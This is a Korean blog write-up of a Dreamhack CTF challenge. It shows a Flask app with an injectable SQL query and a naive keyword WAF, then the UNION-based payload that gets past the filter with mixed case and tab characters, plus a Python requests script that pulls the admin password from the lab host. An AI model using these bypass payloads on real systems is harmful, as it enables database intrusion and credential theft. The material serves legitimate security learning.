---
title: "[2025-07-16] SQL injection Bypass WAF"
excerpt: "Bypass WAF"

categories:
  - Problem
tags:
  - [Bypass WAF]

permalink: /Problem/[2025-07-16] SQL injection Bypass WAF/

toc: true
toc_sticky: true

date: 2025-07-16
last_modified_at: 2025-07-16
---

## 🦥 본문

```sql
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template

if __name__ == '__main__':
    app.run(host='0.0.0.0')

```

데이터베이스를 보니 column은 idx, uid, upw로 구성되어 있다.

guest를 입력하면 result[1]인 guest 값만 출력되는 것을 볼 수 있다. admin의 비밀번호가 FLAG인데, admin 값은 필터링 되어 있었다 → ADmin 같은 대소문자 혼용으로 필터링 우회가 가능하다

공백도 필터링이 되어 있었다. 주석으로 공백을 피하려 했으나 주석 역시 필터링이 되어 있었다. 탭을 의미하는 /t → %09를 통해 필터링 우회가 가능하다

또한 UNION을 사용할 거면 앞의 구문과 column 수가 맞아야 한다. 

```sql
UNION SELECT null, upw, null, From user Where uid = 'admiN); 
```

위와 같은 코드로 보내야 한다.
'%09Union%09Select%09null,upw,null%09From%09user%09where%09uid=\"Admin\"%23을 사이트의 form을 통해 보냈는 데 안되는 거다..

### 풀이

```sql
'%09Union%09Select%09null,upw,null%09From%09user%09where%09uid=\"Admin\"%23
```

을 form을 통해 보내게 되면 이중 인코딩 처리가 되어서 %09가 %2509가 된다. 

```sql
import requests

url = "http://host8.dreamhack.games:16809/"
params = {
    "uid": "'\tUnion\tSelect\tnull,upw,null\tFrom\tuser\twhere\tuid=\"Admin\"#"
}

response = requests.get(url, params=params)
print(response.text)

```

을 통해 보내야 원하는 결과를 얻을 수 있다.

하… 이것도 모르고 똑같은 코드에 시간 엄청 썼다…